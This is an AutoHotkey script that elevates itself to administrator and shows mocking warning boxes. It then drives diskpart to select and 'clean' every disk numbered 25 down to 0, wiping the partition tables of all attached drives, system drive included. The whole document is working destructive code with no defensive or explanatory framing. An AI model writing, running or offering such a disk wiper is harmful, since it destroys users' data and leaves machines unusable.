#NoEnv  ; Recommended for performance and compatibility with future AutoHotkey releases.
; #Warn  ; Enable warnings to assist with detecting common errors.
SendMode Input  ; Recommended for new scripts due to its superior speed and reliability.
SetWorkingDir %A_ScriptDir%  ; Ensures a consistent starting directory.
#SingleInstance, force
if not A_IsAdmin
	Run *RunAs "%A_ScriptFullPath%" ; (A_AhkPath is usually optional if the script has the .ahk extension.) You would typically check  first.
MsgBox, Don't do this
MsgBox, Like actually this is incredibly bad
MsgBox, Stop 
MsgBox, I guess if you really want to
drives := 25
Run, diskpart.exe
Sleep, 6000
WinActivate, C:\WINDOWS\SYSTEM32\diskpart.exe
WinWaitActive, C:\WINDOWS\SYSTEM32\diskpart.exe
sleep, 100
MsgBox, balls
Loop, 26
{
	Send, select disk %drives% {Enter}
	Sleep, 100
	Send, clean {Enter}
	EnvAdd, drives, -1
}


Return
Esc:: ExitApp